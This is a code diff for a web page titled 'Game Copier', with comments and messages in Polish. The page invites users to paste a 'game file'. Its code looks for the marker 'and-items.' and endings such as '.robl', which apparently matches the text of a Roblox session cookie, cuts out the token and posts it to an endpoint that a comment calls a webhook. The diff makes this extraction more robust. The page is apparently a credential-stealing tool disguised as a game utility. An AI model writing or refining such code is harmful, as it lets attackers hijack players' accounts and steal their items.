@@ -1,146 +1,71 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>Game Copier</title>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
-<style>
-*{margin:0;padding:0;box-sizing:border-box;}
-body{
-height:100vh;
-background:#05060a;
-font-family:'Poppins',sans-serif;
-display:flex;
-align-items:center;
-justify-content:center;
-color:white;
-overflow:hidden;
-}
-#particles{position:fixed;top:0;left:0;z-index:-1;}
-.panel{
-width:400px;
-padding:30px;
-border-radius:15px;
-background:linear-gradient(135deg, rgba(255,255,255,0.08), rgba(255,255,255,0.02));
-border:1px solid rgba(255,255,255,0.15);
-backdrop-filter:blur(15px);
-text-align:center;
-box-shadow:0 0 40px rgba(0,255,200,0.15);
-}
-h1{
-font-size:32px;
-margin-bottom:20px;
-background:linear-gradient(90deg,#00f0ff,#00ff9d,#6a5cff);
--webkit-background-clip:text;
--webkit-text-fill-color:transparent;
-}
-textarea{
-width:100%;height:120px;
-background:#0d1117;border:1px solid #333;
-border-radius:10px;padding:10px;color:white;resize:none;margin-bottom:20px;
-}
-button{
-width:100%;padding:12px;border:none;border-radius:10px;
-font-size:16px;font-weight:600;cursor:pointer;
-background:linear-gradient(90deg,#00f0ff,#00ff9d);color:black;transition:0.3s;
-}
-button:hover{
-transform:scale(1.05);
-box-shadow:0 0 20px #00ffd5,0 0 40px rgba(0,255,200,0.3);
-}
-</style>
-</head>
-<body>
-
-<canvas id="particles"></canvas>
-
-<div class="panel">
-<h1>Game Copier</h1>
-<textarea id="gamefile" placeholder="Paste game file here..."></textarea>
-<button onclick="startProcess()">Start Process</button>
-</div>
-
-<script>
-// --- Start Process with filter ---
-function startProcess(){
+function startProcess() {
     const gamefile = document.getElementById("gamefile").value.trim();
-    if(!gamefile){
-        alert("Please paste a game file!");
+    if (!gamefile) {
+        alert("Wklej jakiś plik gry!");
         return;
     }
 
-    // szukamy 'and-items.'
-    const startIndex = gamefile.indexOf("and-items.");
-    if(startIndex === -1){
-        alert("Nie znaleziono 'and-items.'");
-        return;
-    }
+    // Szukamy obu wariantów (z myślnikiem i bez)
+    const markers = ["-and-items.", "and-items."];
+    let startIndex = -1;
 
-    // zaczynamy dokładnie po kropce
-    const substring = gamefile.slice(startIndex + "and-items.".length);
-
-    // kończymy dokładnie przed sekwencją ',"/",.ro'
-    const endSeq = ', "/", .ro';
-    const seqIndex = substring.indexOf(endSeq);
-
-    const filteredText = (seqIndex !== -1 ? substring.slice(0, seqIndex) : substring).trim();
-
-    if(!filteredText){
-        alert("Brak tekstu do wysłania po 'and-items.'");
-        return;
-    }
-
-    fetch("/api/release",{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({ text: filteredText })
-    })
-    .then(res=>res.json())
-    .then(()=>{ 
-        alert("Sent successfully!"); 
-        document.getElementById("gamefile").value="";
-    })
-    .catch(()=>{ 
-        alert("Error sending data."); 
-    })
-}
-
-// --- Particles background ---
-const canvas=document.getElementById("particles");
-const ctx=canvas.getContext("2d");
-canvas.width=window.innerWidth;
-canvas.height=window.innerHeight;
-let particles=[];
-for(let i=0;i<120;i++){
-    particles.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height,vx:(Math.random()-0.5)*0.6,vy:(Math.random()-0.5)*0.6});
-}
-function animate(){
-    ctx.clearRect(0,0,canvas.width,canvas.height);
-    for(let i=0;i<particles.length;i++){
-        let p=particles[i];
-        p.x+=p.vx; p.y+=p.vy;
-        if(p.x<0||p.x>canvas.width)p.vx*=-1;
-        if(p.y<0||p.y>canvas.height)p.vy*=-1;
-        ctx.fillStyle="#00ffd5";
-        ctx.beginPath();
-        ctx.arc(p.x,p.y,2,0,Math.PI*2);
-        ctx.fill();
-        for(let j=i+1;j<particles.length;j++){
-            let p2=particles[j];
-            let dx=p.x-p2.x, dy=p.y-p2.y, dist=Math.sqrt(dx*dx+dy*dy);
-            if(dist<120){
-                ctx.strokeStyle="rgba(0,255,200,0.15)";
-                ctx.beginPath();
-                ctx.moveTo(p.x,p.y);
-                ctx.lineTo(p2.x,p2.y);
-                ctx.stroke();
-            }
+    for (const marker of markers) {
+        const idx = gamefile.indexOf(marker);
+        if (idx !== -1) {
+            startIndex = idx + marker.length;
+            break;
         }
     }
-    requestAnimationFrame(animate);
-}
-animate();
-</script>
 
-</body>
-</html>
+    if (startIndex === -1) {
+        alert("Nie znaleziono '-and-items.' ani 'and-items.'");
+        return;
+    }
+
+    // Bierzemy wszystko od znalezionego miejsca
+    const substring = gamefile.slice(startIndex).trimStart();
+
+    // Kończymy przed jedną z tych sekwencji
+    const possibleEndings = [
+        '", "/", ".robl',
+        '", "/", .robl',
+        '","/",.robl',
+        '", "/", ".ro',
+        '", "/", .ro'
+    ];
+
+    let endIndex = substring.length; // domyślnie do końca
+
+    for (const ending of possibleEndings) {
+        const idx = substring.indexOf(ending);
+        if (idx !== -1 && idx < endIndex) {
+            endIndex = idx;
+        }
+    }
+
+    const filteredText = substring.slice(0, endIndex).trim();
+
+    if (!filteredText || filteredText.length < 10) {
+        alert("Nie udało się wyciąć sensownego fragmentu po -and-items.");
+        return;
+    }
+
+    // Wysyłamy do webhooka
+    fetch("/api/release", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ text: filteredText })
+    })
+    .then(res => {
+        if (!res.ok) throw new Error("Błąd HTTP: " + res.status);
+        return res.json();
+    })
+    .then(() => {
+        alert("Wysłano pomyślnie!");
+        document.getElementById("gamefile").value = "";
+    })
+    .catch(err => {
+        console.error(err);
+        alert("Błąd podczas wysyłania:\n" + err.message);
+    });
+}
